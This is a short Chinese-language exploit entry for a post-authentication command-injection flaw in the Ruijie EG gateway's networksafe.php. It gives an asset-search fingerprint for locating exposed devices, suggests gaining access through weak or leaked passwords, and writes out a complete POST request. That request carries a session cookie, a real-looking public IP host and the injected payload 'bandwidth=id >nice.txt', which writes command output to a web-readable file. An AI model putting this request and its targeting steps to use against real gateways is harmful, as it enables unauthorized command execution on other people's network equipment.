# 锐捷EG易网关networksafe远程代码执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="Ruijie-EG易网关"`
- **请求**：`POST /itbox_pi/networksafe.php?a=set HTTP/1.1`

**请求体 / payload**
```
**一、漏洞简介**\
锐捷 EG易网关cli存在后台远程命令执行漏洞。\
**二、影响版本**\
`锐捷EG易网关`\
**三、资产测绘**\
`app="Ruijie-EG易网关"`\
●登录页面
**四、漏洞复现**\
1、通过弱口令或账号密码泄露漏洞登录后台获取cookie
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 117.40.253.197:4430
Content-Length: 23
bandwidth=id >nice.txt

写入文件地址
/itbox_pi/nice.txt
```